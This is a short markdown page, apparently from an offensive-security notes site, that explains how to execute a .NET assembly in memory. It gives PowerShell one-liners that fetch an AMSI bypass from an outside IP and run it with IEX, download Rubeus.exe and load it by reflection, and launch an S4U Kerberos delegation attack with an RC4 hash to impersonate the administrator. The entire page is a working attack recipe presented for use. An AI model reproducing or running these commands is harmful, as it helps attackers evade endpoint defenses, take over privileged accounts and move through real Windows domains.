---
title: Execute Assembly
layout: default
parent: Shell Preparation
nav_order: 3
---

1. First bypass AMSI:\
`(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/amsi.txt') | IEX`

2. Select the assembly:\
`$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/Rubeus.exe')`

3. Load it:\
`$assem = [System.Reflection.Assembly]::Load($data)`

4. Can then use it like this:\
`[Rubeus.Program]::Main("s4u /user:web01$ /rc4:12343649cc8ce713962859a2934b8cbb /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())`